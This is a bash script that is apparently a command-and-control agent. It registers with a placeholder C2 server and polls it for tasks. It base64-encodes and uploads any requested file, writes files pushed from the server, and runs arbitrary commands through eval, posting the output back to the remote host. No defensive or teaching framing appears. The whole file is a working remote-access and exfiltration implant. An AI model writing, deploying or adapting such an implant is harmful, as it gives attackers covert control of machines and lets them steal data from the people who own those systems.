#!/bin/bash

C2_SERVER_IP="http://C2-SERVER-IP:80"
AUTH="MySecretKey123"
POLL_INTERVAL=2

auth_header=(-H "Authorization: Bearer $AUTH")

# Register agent
AGENT_ID=$(curl -s -X POST "${auth_header[@]}" "$C2_SERVER_IP/register" | jq -r '.agent_id')

while true; do
    TASK=$(curl -s "${auth_header[@]}" "$C2_SERVER_IP/task/$AGENT_ID" | jq -r '.task')

    if [[ -n "$TASK" && "$TASK" != "null" ]]; then

        # JSON task
        if [[ "$TASK" =~ ^\{ ]]; then
            TASK_TYPE=$(jq -r '.type // empty' <<< "$TASK")

            case "$TASK_TYPE" in
                get)
                    REMOTE_PATH=$(jq -r '.path' <<< "$TASK")
                    if [[ -f "$REMOTE_PATH" ]]; then
                        FILENAME=$(basename "$REMOTE_PATH")
                        B64=$(base64 -w0 "$REMOTE_PATH")
                        PAYLOAD=$(jq -n --arg f "$FILENAME" --arg d "$B64" \
                                   '{type:"file",filename:$f,data:$d}')
                    else
                        PAYLOAD=$(jq -n --arg p "$REMOTE_PATH" \
                                   '{type:"error",result:"File not found: " + $p}')
                    fi
                    curl -s -X POST "${auth_header[@]}" -H "Content-Type: application/json" \
                        -d "$PAYLOAD" "$C2_SERVER_IP/result/$AGENT_ID"
                    ;;
                
                put)
                    FILENAME=$(jq -r '.filename' <<< "$TASK")
                    jq -r '.data' <<< "$TASK" | base64 --decode > "$FILENAME"
                    PAYLOAD=$(jq -n --arg f "$FILENAME" \
                               '{type:"info",result:"Received file " + $f}')
                    curl -s -X POST "${auth_header[@]}" -d "$PAYLOAD" \
                        "$C2_SERVER_IP/result/$AGENT_ID"
                    ;;
            esac

        else
            # Shell command
            RESULT=$(eval "$TASK" 2>&1)
            PAYLOAD=$(printf '%s' "$RESULT")
            curl -s -X POST "${auth_header[@]}" -H "Content-Type: application/json" \
                --data-binary "$PAYLOAD" "$C2_SERVER_IP/result/$AGENT_ID"
        fi
    fi

    sleep "$POLL_INTERVAL"
done
